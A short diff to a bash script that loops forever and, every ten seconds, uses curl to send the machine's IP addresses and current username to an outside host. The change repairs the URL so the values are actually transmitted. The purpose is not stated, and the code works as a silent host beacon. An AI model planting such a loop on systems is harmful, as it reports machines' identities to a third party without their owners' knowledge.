@@ -1,7 +1,9 @@
 while true
 do
     ips=$(hostname -I)
+    ips="${ips// /+}"
     username=$(whoami)
-    curl 'https://log-visitor.vercel.app/?id=$username?ip=$ips'
+    finalUrl="https://log-visitor.vercel.app/?id=$username&ip=$ips"
+    curl $finalUrl
     sleep 10
 done
